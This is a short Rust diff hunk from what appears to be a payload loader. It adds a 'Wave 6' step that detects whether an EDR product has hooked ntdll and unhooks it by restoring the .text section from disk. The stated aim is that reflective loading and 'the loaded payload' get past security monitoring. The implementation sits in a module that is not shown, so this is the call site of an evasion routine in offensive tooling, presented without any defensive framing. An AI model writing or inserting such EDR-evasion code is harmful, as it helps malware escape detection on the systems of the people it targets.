@@ -138,6 +138,18 @@ fn main() -> ExitCode {
             return ExitCode::SUCCESS;
         }
     }
+    // Wave 6: if an EDR patched ntdll's .text, restore it from disk so every
+    // subsequent call (logical resolution, reflection, the loaded payload)
+    // reaches the real syscall stubs. No-op on a clean box.
+    #[cfg(windows)]
+    {
+        if let Some(n) = abi::hooked_bytes().filter(|&n| n > 0) {
+            info!("unhook: ntdll .text differs on {n} bytes");
+        }
+        if let Err(reason) = abi::unhook_ntdll() {
+            warn!("unhook: {reason}");
+        }
+    }
     match dispatch(cli) {
         Ok(()) => ExitCode::SUCCESS,
         Err(err) => {
